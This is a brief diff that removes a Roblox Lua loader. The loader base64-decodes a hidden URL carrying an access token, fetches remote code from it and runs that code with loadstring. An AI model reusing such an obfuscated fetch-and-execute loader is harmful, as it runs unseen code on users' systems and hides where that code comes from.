@@ -1,10 +1,1 @@
-local encodedUrl = "aHR0cHM6Ly9yYXYuZ2l0aHViLmNvbS9Mb3VpczU2MzIvNzQ3Mjg5L2JlZnMvcGVhZHMvbWFpbi83NDgzOTQ3NzU3MjQ/dG9rZW49R0hTQVRBMEFBQUFBQUNaVVAzTVVETVZTVVdCNFlQSFRFT1pZOFk3WUpMQQ=="
 
--- Function to decode base64
-local function decodeBase64(str)
-    return game:GetService("HttpService"):Base64Decode(str)
-end
-
-local url = decodeBase64(encodedUrl)
-
-loadstring(game:HttpGet(url))()
